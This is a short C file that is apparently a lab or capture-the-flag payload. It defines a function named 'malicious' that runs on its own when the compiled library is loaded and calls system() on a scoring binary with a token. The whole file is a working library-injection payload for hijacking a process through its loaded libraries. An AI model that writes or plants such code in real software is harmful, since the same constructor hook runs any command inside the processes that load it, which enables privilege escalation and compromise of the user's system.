#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score bc7d96d7-d9b4-4f0c-aeb3-9bb763203c70");
}